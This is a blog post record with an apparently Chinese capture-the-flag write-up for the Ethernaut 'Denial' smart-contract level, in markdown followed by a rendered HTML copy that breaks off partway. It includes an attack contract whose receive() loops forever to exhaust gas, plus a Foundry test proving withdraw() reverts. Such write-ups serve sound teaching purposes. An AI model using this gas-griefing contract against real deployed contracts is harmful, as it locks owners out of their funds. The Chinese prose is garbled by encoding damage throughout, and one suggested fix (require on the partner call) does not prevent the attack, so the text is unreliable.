é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 20 - Denial](https://ethernaut.openzeppelin.com/level/20)  \n> **æ”»å‡»ç±»å‹**: æ‹’ç»æœåŠ¡ (Denial of Service - DoS)  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯é˜»æ­¢ `owner` ä»åˆçº¦ä¸­æå–èµ„é‡‘ã€‚ä½ éœ€è¦è®© `withdraw()` å‡½æ•°æ— æ³•æˆåŠŸæ‰§è¡Œï¼Œä»è€Œå®ç°æ‹’ç»æœåŠ¡æ”»å‡»ã€‚\n\n![Denial Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ `withdraw()` å‡½æ•°çš„å®ç°ï¼š\n\n```solidity\ncontract Denial {\n    // ...\n    address public partner; // The partner can be set by anyone.\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        \n        // Perform the call. We don't check the return value.\n        partner.call{value: amountToSend}(\"\");\n        \n        payable(owner).transfer(amountToSend);\n    }\n}\n```\n\næ¼æ´ç‚¹éå¸¸æ˜ç¡®ï¼š\n\n1.  **ä»»æ„è®¾ç½® `partner`**: ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ `setWithdrawPartner()` æ¥è®¾ç½® `partner` åœ°å€ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°† `partner` è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„æ¶æ„åˆçº¦ã€‚\n2.  **æœªæ£€æŸ¥çš„å¤–éƒ¨è°ƒç”¨**: `partner.call{value: amountToSend}(\"\")` æ˜¯ä¸€ä¸ªå¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨ã€‚å…³é”®åœ¨äºï¼Œä»£ç **æ²¡æœ‰æ£€æŸ¥ `call` çš„è¿”å›å€¼**ã€‚å¦‚æœè¿™ä¸ª `call` å¤±è´¥ï¼Œå‡½æ•°ä¼šç»§ç»­æ‰§è¡Œã€‚\n3.  **Gas è½¬å‘**: `call` é»˜è®¤ä¼šè½¬å‘æ‰€æœ‰å‰©ä½™çš„ Gasã€‚å¦‚æœ `partner` åˆçº¦çš„ `receive()` æˆ– `fallback()` å‡½æ•°æ˜¯ä¸€ä¸ª Gas é™·é˜±ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ— é™å¾ªç¯ï¼‰ï¼Œå®ƒå°†è€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ª `withdraw()` äº¤æ˜“å›  `out of gas` è€Œå¤±è´¥ã€‚\n\næ”»å‡»æ€è·¯å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å°†éƒ¨ç½²ä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º `partner`ã€‚å½“ `owner` è°ƒç”¨ `withdraw()` æ—¶ï¼Œå¯¹æˆ‘ä»¬æ¶æ„åˆçº¦çš„ `call` å°†ä¼šæ‰§è¡Œï¼Œè§¦å‘æˆ‘ä»¬çš„æ¶æ„é€»è¾‘ï¼Œä»è€Œä½¿æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚\n\næˆ‘ä»¬çš„æ¶æ„åˆçº¦åªéœ€è¦ä¸€ä¸ª `receive()` å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ï¼š\n\n```solidity\ncontract MaliciousPartner {\n    receive() external payable {\n        // Consume all gas\n        while (true) {}\n    }\n}\n```\n\nå½“ `withdraw()` å‡½æ•°å‘è¿™ä¸ªåˆçº¦å‘é€ä»¥å¤ªå¸æ—¶ï¼Œ`receive()` å‡½æ•°è¢«è§¦å‘ï¼Œè¿›å…¥æ— é™å¾ªç¯ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´ `withdraw()` äº¤æ˜“ `revert`ã€‚`owner` æ°¸è¿œæ— æ³•æˆåŠŸæå–èµ„é‡‘ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ª `receive()` å‡½æ•°ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// æ¶æ„åˆçº¦ï¼Œç”¨äºå‘åŠ¨ DoS æ”»å‡»\ncontract Attack {\n    // å½“æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶ï¼Œè¿›å…¥æ— é™å¾ªç¯ä»¥è€—å°½æ‰€æœ‰ Gas\n    receive() external payable {\n        while (true) {}\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç éœ€è¦éªŒè¯ `withdraw()` è°ƒç”¨ç¡®å®å¤±è´¥äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„ `vm.expectRevert()` æ¥å®ç°è¿™ä¸€ç‚¹ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/20_Denial.sol\";\n\ncontract DenialTest is Test {\n    Denial instance;\n    Attack attacker;\n    address owner;\n    address player; // æ”»å‡»è€…\n\n    function setUp() public {\n        owner = vm.addr(1);\n        player = vm.addr(2);\n\n        // éƒ¨ç½² Denial åˆçº¦å¹¶å­˜å…¥ 1 ether\n        vm.startPrank(owner);\n        instance = new Denial();\n        vm.deal(address(instance), 1 ether);\n        vm.stopPrank();\n\n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        attacker = new Attack();\n    }\n\n    function testDenialOfServiceAttack() public {\n        // 1. æ”»å‡»è€…å°†æ¶æ„åˆçº¦è®¾ç½®ä¸º partner\n        vm.prank(player);\n        instance.setWithdrawPartner(address(attacker));\n\n        // 2. owner å°è¯•ææ¬¾\n        vm.startPrank(owner);\n        uint256 initialOwnerBalance = owner.balance;\n\n        // 3. æ–­è¨€äº¤æ˜“ä¼šå¤±è´¥ (revert)\n        // å› ä¸ºå¯¹æ¶æ„ partner çš„è°ƒç”¨ä¼šè€—å°½æ‰€æœ‰ gas\n        vm.expectRevert();\n        instance.withdraw();\n\n        // 4. éªŒè¯ owner çš„ä½™é¢æ²¡æœ‰å¢åŠ \n        assertEq(owner.balance, initialOwnerBalance);\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **éƒ¨ç½²æ¶æ„åˆçº¦**: åˆ›å»ºä¸€ä¸ª `Attack` åˆçº¦ï¼Œå…¶ `receive()` å‡½æ•°åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ã€‚\n2.  **è®¾ç½® `partner`**: è°ƒç”¨ `setWithdrawPartner()`ï¼Œå°† `Denial` åˆçº¦çš„ `partner` è®¾ç½®ä¸º `Attack` åˆçº¦çš„åœ°å€ã€‚\n3.  **è§¦å‘æ¼æ´**: å½“ `owner` è°ƒç”¨ `withdraw()` æ—¶ï¼Œå¯¹ `partner` çš„ `call` ä¼šè§¦å‘ `Attack` åˆçº¦çš„ `receive()` å‡½æ•°ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **æ£€æŸ¥å¤–éƒ¨è°ƒç”¨çš„è¿”å›å€¼**: æ°¸è¿œä¸è¦å‡è®¾å¤–éƒ¨è°ƒç”¨ä¼šæˆåŠŸã€‚å¿…é¡»æ£€æŸ¥ `call` çš„è¿”å›å€¼ï¼Œå¹¶å¯¹å¤±è´¥æƒ…å†µè¿›è¡Œå¤„ç†ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    (bool sent, ) = partner.call{value: amountToSend}(\"\");\n    require(sent, \"Failed to send Ether to partner\");\n    ```\n\n2.  **éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼**: åº”è¯¥åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ä¹‹åå†ä¸å¤–éƒ¨åˆçº¦äº¤äº’ã€‚è™½ç„¶åœ¨æœ¬ä¾‹ä¸­ä¸æ˜¯ç›´æ¥åŸå› ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„å®‰å…¨æœ€ä½³å®è·µã€‚\n3.  **é™åˆ¶ Gas**: åœ¨è¿›è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œæ˜ç¡®æŒ‡å®šè½¬å‘çš„ Gas æ•°é‡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„å…¨é¢è½¬å‘ã€‚è¿™å¯ä»¥é™åˆ¶æ¶æ„åˆçº¦å¯èƒ½é€ æˆçš„æŸå®³ã€‚\n\n    ```solidity\n    // é™åˆ¶ Gas\n    partner.call{value: amountToSend, gas: 50000}(\"\");\n    ```\n\n4.  **å¼•å…¥ææ¬¾æ¨¡å¼ (Pull-over-Push)**: ä¸è¦ä¸»åŠ¨â€œæ¨é€â€èµ„é‡‘ç»™ç”¨æˆ·ï¼Œè€Œæ˜¯è®©ç”¨æˆ·è‡ªå·±â€œæ‹‰å–â€ï¼ˆææ¬¾ï¼‰ã€‚ç”¨æˆ·è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ¥ææ¬¾ï¼Œè€Œä¸æ˜¯åˆçº¦è‡ªåŠ¨å‘é€èµ„é‡‘ã€‚è¿™å¯ä»¥é˜²æ­¢å› å¤–éƒ¨è°ƒç”¨å¤±è´¥è€Œå¯¼è‡´çš„é—®é¢˜ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **æ‹’ç»æœåŠ¡ (DoS)**: ä¸€ç§å¸¸è§çš„æ”»å‡»ç±»å‹ï¼Œæ—¨åœ¨ä½¿ç³»ç»Ÿæ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æœåŠ¡ã€‚\n-   **`call`**: Solidity ä¸­ç”¨äºä¸å…¶ä»–åˆçº¦äº¤äº’çš„åº•å±‚å‡½æ•°ã€‚å®ƒåŠŸèƒ½å¼ºå¤§ä½†ä¹Ÿå¾ˆå±é™©ï¼Œéœ€è¦å°å¿ƒä½¿ç”¨ã€‚\n-   **`receive()` å‡½æ•°**: åˆçº¦åœ¨æ¥æ”¶åˆ°æ²¡æœ‰ `calldata` çš„ä»¥å¤ªå¸æ—¶æ‰§è¡Œçš„ç‰¹æ®Šå‡½æ•°ã€‚\n-   **Gas**: EVM ä¸­ç”¨äºè¡¡é‡è®¡ç®—æˆæœ¬çš„å•ä½ã€‚å¯¹ Gas çš„æ“çºµæ˜¯è®¸å¤šé«˜çº§æ”»å‡»çš„åŸºç¡€ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   å¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¯èƒ½ä¼šå¤±è´¥æˆ–è¢«æ¶æ„åˆ©ç”¨ã€‚\n-   å¿…é¡»å§‹ç»ˆæ£€æŸ¥åº•å±‚ `call` çš„è¿”å›å€¼ã€‚\n-   ä¸å—é™åˆ¶çš„ Gas è½¬å‘ä¼šç»™æ¶æ„åˆçº¦æ‰§è¡Œä»»æ„å¤æ‚ï¼ˆä¸”è€— Gasï¼‰ä»£ç çš„æœºä¼šã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡ä¸€ä¸ªå¯è¢«ä»»æ„è®¾ç½®çš„åœ°å€ï¼Œå°†æ¶æ„åˆçº¦å¼•å…¥åˆ°ç›®æ ‡åˆçº¦çš„æ‰§è¡Œæµç¨‹ä¸­ã€‚\n-   åœ¨æ¶æ„åˆçº¦çš„ `receive()` æˆ– `fallback()` å‡½æ•°ä¸­åˆ¶é€  Gas é™·é˜±ï¼Œè€—å°½äº¤æ˜“çš„ Gasï¼Œå¯¼è‡´ä¸»è°ƒç”¨å¤±è´¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   æ£€æŸ¥ `call` çš„è¿”å›å€¼ã€‚\n-   é™åˆ¶å¤–éƒ¨è°ƒç”¨çš„ Gasã€‚\n-   ä¼˜å…ˆä½¿ç”¨â€œææ¬¾â€æ¨¡å¼è€Œä¸æ˜¯â€œæ¨é€â€æ¨¡å¼ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: Sending Ether](https://docs.soliditylang.org/en/latest/contracts.html#sending-ether)\n-   [Consensys: Denial of Service](https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos)","slug":"ethernaut-level-20-denial","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbph001gbf5qdvjialg1","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-20-Denial-é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\"><a href=\"#ğŸ¯-Ethernaut-Level-20-Denial-é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\"></a>ğŸ¯ Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/20\">Ethernaut Level 20 - Denial</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ‹’ç»æœåŠ¡ (Denial of Service - DoS)<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯é˜»æ­¢ <code>owner</code> ä»åˆçº¦ä¸­æå–èµ„é‡‘ã€‚ä½ éœ€è¦è®© <code>withdraw()</code> å‡½æ•°æ— æ³•æˆåŠŸæ‰§è¡Œï¼Œä»è€Œå®ç°æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg\" alt=\"Denial Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ <code>withdraw()</code> å‡½æ•°çš„å®ç°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Denial &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    address public partner; // The partner can be set by anyone.</span><br><span class=\"line\"></span><br><span class=\"line\">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class=\"line\">        partner = _partner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amountToSend = address(this).balance / 100;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // Perform the call. We don&#x27;t check the return value.</span><br><span class=\"line\">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        payable(owner).transfer(amountToSend);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ¼æ´ç‚¹éå¸¸æ˜ç¡®ï¼š</p>\n<ol>\n<li><strong>ä»»æ„è®¾ç½® <code>partner</code></strong>: ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ <code>setWithdrawPartner()</code> æ¥è®¾ç½® <code>partner</code> åœ°å€ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°† <code>partner</code> è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„æ¶æ„åˆçº¦ã€‚</li>\n<li><strong>æœªæ£€æŸ¥çš„å¤–éƒ¨è°ƒç”¨</strong>: <code>partner.call&#123;value: amountToSend&#125;(&quot;&quot;)</code> æ˜¯ä¸€ä¸ªå¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨ã€‚å…³é”®åœ¨äºï¼Œä»£ç <strong>æ²¡æœ‰æ£€æŸ¥ <code>call</code> çš„è¿”å›å€¼</strong>ã€‚å¦‚æœè¿™ä¸ª <code>call</code> å¤±è´¥ï¼Œå‡½æ•°ä¼šç»§ç»­æ‰§è¡Œã€‚</li>\n<li><strong>Gas è½¬å‘</strong>: <code>call</code> é»˜è®¤ä¼šè½¬å‘æ‰€æœ‰å‰©ä½™çš„ Gasã€‚å¦‚æœ <code>partner</code> åˆçº¦çš„ <code>receive()</code> æˆ– <code>fallback()</code> å‡½æ•°æ˜¯ä¸€ä¸ª Gas é™·é˜±ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ— é™å¾ªç¯ï¼‰ï¼Œå®ƒå°†è€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ª <code>withdraw()</code> äº¤æ˜“å›  <code>out of gas</code> è€Œå¤±è´¥ã€‚</li>\n</ol>\n<p>æ”»å‡»æ€è·¯å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å°†éƒ¨ç½²ä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º <code>partner</code>ã€‚å½“ <code>owner</code> è°ƒç”¨ <code>withdraw()</code> æ—¶ï¼Œå¯¹æˆ‘ä»¬æ¶æ„åˆçº¦çš„ <code>call</code> å°†ä¼šæ‰§è¡Œï¼Œè§¦å‘æˆ‘ä»¬çš„æ¶æ„é€»è¾‘ï¼Œä»è€Œä½¿æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚</p>\n<p>æˆ‘ä»¬çš„æ¶æ„åˆçº¦åªéœ€è¦ä¸€ä¸ª <code>receive()</code> å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MaliciousPartner &#123;</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // Consume all gas</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å½“ <code>withdraw()</code> å‡½æ•°å‘è¿™ä¸ªåˆçº¦å‘é€ä»¥å¤ªå¸æ—¶ï¼Œ<code>receive()</code> å‡½æ•°è¢«è§¦å‘ï¼Œè¿›å…¥æ— é™å¾ªç¯ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´ <code>withdraw()</code> äº¤æ˜“ <code>revert</code>ã€‚<code>owner</code> æ°¸è¿œæ— æ³•æˆåŠŸæå–èµ„é‡‘ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ª <code>receive()</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ¶æ„åˆçº¦ï¼Œç”¨äºå‘åŠ¨ DoS æ”»å‡»</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // å½“æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶ï¼Œè¿›å…¥æ— é™å¾ªç¯ä»¥è€—å°½æ‰€æœ‰ Gas</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç éœ€è¦éªŒè¯ <code>withdraw()</code> è°ƒç”¨ç¡®å®å¤±è´¥äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„ <code>vm.expectRevert()</code> æ¥å®ç°è¿™ä¸€ç‚¹ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/20_Denial.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DenialTest is Test &#123;</span><br><span class=\"line\">    Denial instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    address player; // æ”»å‡»è€…</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        owner = vm.addr(1);</span><br><span class=\"line\">        player = vm.addr(2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½² Denial åˆçº¦å¹¶å­˜å…¥ 1 ether</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        instance = new Denial();</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        attacker = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDenialOfServiceAttack() public &#123;</span><br><span class=\"line\">        // 1. æ”»å‡»è€…å°†æ¶æ„åˆçº¦è®¾ç½®ä¸º partner</span><br><span class=\"line\">        vm.prank(player);</span><br><span class=\"line\">        instance.setWithdrawPartner(address(attacker));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. owner å°è¯•ææ¬¾</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        uint256 initialOwnerBalance = owner.balance;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. æ–­è¨€äº¤æ˜“ä¼šå¤±è´¥ (revert)</span><br><span class=\"line\">        // å› ä¸ºå¯¹æ¶æ„ partner çš„è°ƒç”¨ä¼šè€—å°½æ‰€æœ‰ gas</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. éªŒè¯ owner çš„ä½™é¢æ²¡æœ‰å¢åŠ </span><br><span class=\"line\">        assertEq(owner.balance, initialOwnerBalance);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>éƒ¨ç½²æ¶æ„åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ª <code>Attack</code> åˆçº¦ï¼Œå…¶ <code>receive()</code> å‡½æ•°åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ã€‚</li>\n<li><strong>è®¾ç½® <code>partner</code></strong>: è°ƒç”¨ <code>setWithdrawPartner()</code>ï¼Œå°† <code>Denial</code> åˆçº¦çš„ <code>partner</code> è®¾ç½®ä¸º <code>Attack</code> åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>è§¦å‘æ¼æ´</strong>: å½“ <code>owner</code> è°ƒç”¨ <code>withdraw()</code> æ—¶ï¼Œå¯¹ <code>partner</code> çš„ <code>call</code> ä¼šè§¦å‘ <code>Attack</code> åˆçº¦çš„ <code>receive()</code> å‡½æ•°ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>æ£€æŸ¥å¤–éƒ¨è°ƒç”¨çš„è¿”å›å€¼</strong>: æ°¸è¿œä¸è¦å‡è®¾å¤–éƒ¨è°ƒç”¨ä¼šæˆåŠŸã€‚å¿…é¡»æ£€æŸ¥ <code>call</code> çš„è¿”å›å€¼ï¼Œå¹¶å¯¹å¤±è´¥æƒ…å†µè¿›è¡Œå¤„ç†ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">(bool sent, ) = partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">require(sent, &quot;Failed to send Ether to partner&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼</strong>: 